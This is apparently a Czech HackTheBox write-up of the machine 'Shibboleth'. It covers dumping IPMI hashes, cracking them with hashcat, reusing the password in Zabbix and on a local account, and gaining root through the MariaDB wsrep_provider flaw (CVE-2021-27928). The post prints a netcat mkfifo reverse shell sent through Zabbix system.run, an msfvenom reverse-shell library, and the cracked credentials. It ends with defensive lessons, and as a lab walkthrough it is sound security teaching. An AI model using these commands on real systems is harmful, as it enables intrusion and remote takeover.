---
layout: post
author: Tomáš Matějíček
title: "Shibboleth"
date: 2021-01-16
tags: linux rce exploit enumeration privesc hackthebox
---
## Úvod a kontext

Shibboleth je stroj, kde rozhodující stopa neleží na webu, ale na netypicky otevřeném IPMI portu. Webová enumerace sice ukáže několik virtuálních hostů, ale bez přístupu do Zabbixu by sama o sobě nestačila. Klíč k footholdu přinese až IPMI hash, jeho prolomení a reuse stejného hesla v administraci monitoringu. Tohle propojení reuse a monitorovací platformy dobře zapadá i do článků [Password reuse a rozpad hranic mezi aplikací, SSH, WinRM a admin nástroji](/techniky/password-reuse-a-rozpad-hranic-mezi-aplikaci-ssh-winrm-a-admin-nastroji) a [Monitoring, observability a admin platformy jako útoková plocha](/techniky/monitoring-observability-a-admin-platformy-jako-utokova-plocha).

Root část pak dobře ukazuje rozdíl mezi databázovým účtem a databázovým serverem. Únik hesla do MariaDB ještě automaticky nedává roota, ale v kombinaci se zranitelným Galera `wsrep_provider` už ano.

## Počáteční průzkum

### Vyhledání otevřených portů

Nejdřív mapuji standardní TCP služby. Na první pohled je vidět hlavně Apache na portu `80`.

```bash
ports=$(nmap -p- --min-rate=1000 -T4 $IP | grep ^[0-9] | cut -d "/" -f 1 | tr "\n" "," | sed s/,$//);echo $ports;nmap -p $ports -A -sC -sV -v $IP
```

```text
PORT      STATE  SERVICE VERSION
80/tcp    open   http    Apache httpd 2.4.41
```

Vedle TCP služeb ale mělo smysl zkontrolovat i UDP, protože některé správcovské protokoly se běžných TCP scanů vůbec neúčastní.

```bash
nmap -sU --min-rate 5000 --max-retries 1 -p- --open $IP
```

```text
PORT    STATE SERVICE
623/udp open  asf-rmcp
```

Port `623/udp` znamená IPMI. To je silná stopa, protože špatně chráněné BMC rozhraní často dovolí získat challenge-response hash bez znalosti hesla.

## Analýza zjištění

### Dump hashů z IPMI

Na IPMI se hodí specializovaný skener, který umí vytáhnout hash autentizace. Praktickou roli `msfconsole` jako frameworku pro podobné pomocné moduly rozebírám i v článku [Metasploit: msfconsole a msfvenom](/nastroje/metasploit-msfconsole-a-msfvenom):

```text
msfconsole
use scanner/ipmi/ipmi_dumphashes
set RHOST 10.10.11.124
```

```text
[+] 10.10.11.124:623 - IPMI - Hash found: Administrator:__CENSORED__:__CENSORED__
```

Tento krok ještě nepřináší přímý přístup, ale poskytuje materiál pro offline cracking. To je bezpečnostně důležité: obrana se už nemůže spoléhat na rate limiting ani MFA, protože další útok probíhá mimo cílový systém.

### Prolomení hesla a vazba na Zabbix

Hash se podařilo prolomit pomocí `hashcat`:

```bash
hashcat --force -m 7300 -a 0 "__CENSORED__:__CENSORED__" /usr/share/wordlists/rockyou.txt
```

```text
ilovepumkinpie1
```

V další fázi dávalo smysl najít webové subdomény, které by stejné heslo mohly používat. Subdomain fuzzing odhalil `monitor`, `monitoring` a hlavně `zabbix`:

```text
monitor
monitoring
zabbix
```

Přihlášení do Zabbixu fungovalo s kombinací:

```text
Administrator / ilovepumkinpie1
```

To je důležitý moment celého řetězce: nejde o samotný IPMI přístup, ale o reuse stejného hesla mezi oddělenými službami.

## Získání přístupu

### RCE přes `system.run` v Zabbixu

Po přihlášení do Zabbixu bylo možné vytvořit item se vzdáleným příkazem přes `system.run`. Tato funkce je legitimní součást monitoringu, ale v rukou administrátora je to přímo kanál pro spuštění shellu na hostu.

Použitý příkaz:

```text
system.run[rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i |nc 10.10.14.9 4000 > /tmp/f&,nowait]
```

Tím vznikl shell na cílovém systému. Z `/etc/passwd` bylo vidět, že zajímavý lokální účet je `ipmi-svc`, a protože heslo z IPMI už bylo známé, šlo vyzkoušet i lokální reuse:

```bash
su ipmi-svc
```

Po zadání stejného hesla `ilovepumkinpie1` se podařilo přepnout do tohoto účtu a potvrdit uživatelský přístup:

```bash
cat user.txt
```

```text
__CENSORED__
```

## Eskalace oprávnění

### Databázové přihlašovací údaje ze Zabbix konfigurace

Jakmile už běží shell na hostu, dává smysl procházet lokální konfigurace služeb. U Zabbix serveru je klíčový soubor:

```text
/etc/zabbix/zabbix_server.conf
```

Ten obsahoval přihlašovací údaje do MariaDB:

```ini
DBHost=localhost
DBName=zabbix
DBUser=zabbix
DBPassword=bloooarskybluh
```

Databázové heslo samo o sobě nestačí, ale ukazuje na další důvěryhodnou službu běžící lokálně s vyššími oprávněními.

### Zneužití `wsrep_provider`

Na hostu byla zneužitelná Galera/MariaDB konfigurace umožňující nahrát vlastní sdílenou knihovnu jako `wsrep_provider`. Princip je jednoduchý: databázový proces načte útočníkem dodaný `.so` soubor a spustí jeho inicializační kód v privilegovaném kontextu.

Nejdřív se připravil payload:

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.9 LPORT=4001 -f elf-so -o CVE-2021-27928.so
```

Pak se knihovna zapsala jako nový provider:

```sql
mysql -u zabbix -pbloooarskybluh
SET GLOBAL wsrep_provider="/tmp/CVE-2021-27928.so";
```

Tím došlo ke spuštění kódu v kontextu databázové služby a následně i k přístupu k `root.txt`:

```bash
cat /root/root.txt
```

```text
__CENSORED__
```

## Shrnutí klíčových poznatků

- Zásadní vstupní stopou nebyl web, ale otevřený IPMI port a možnost vytáhnout z něj offline cracknutelný hash.
- Prolomené heslo mělo skutečnou hodnotu až kvůli reuse mezi IPMI, Zabbixem a lokálním účtem `ipmi-svc`.
- Zabbix `system.run` není exploit v tradičním smyslu, ale legitimní administrativní funkce, která se po kompromitaci účtu mění v RCE.
- Root část stála na zneužití databázové funkce pro načtení vlastní knihovny, tedy na důvěře serveru v lokálně zadaný `wsrep_provider`.

## Co si odnést do praxe

- IPMI a další out-of-band management musí být izolovaný od běžné sítě. Jakmile je dostupný z útočníkova segmentu, dokáže často obejít běžnou ochranu kolem systému.
- Reuse hesel mezi správou hardwaru, monitoringem a lokálními účty dramaticky zvyšuje dopad jediné kompromitace. Tyto vrstvy musí mít oddělené identity i tajemství.
- Monitoring nástroje s funkcemi typu `system.run` je potřeba vnímat jako vysoce privilegovaný prvek infrastruktury. Únik administrátorského účtu zde znamená přímé spuštění příkazů na hostu.
- Databázové servery nesmí umožnit načítání neověřených lokálních modulů z cest, které může ovlivnit kompromitovaný uživatel. Jinak se z konfigurační volby stane lokální privesc.
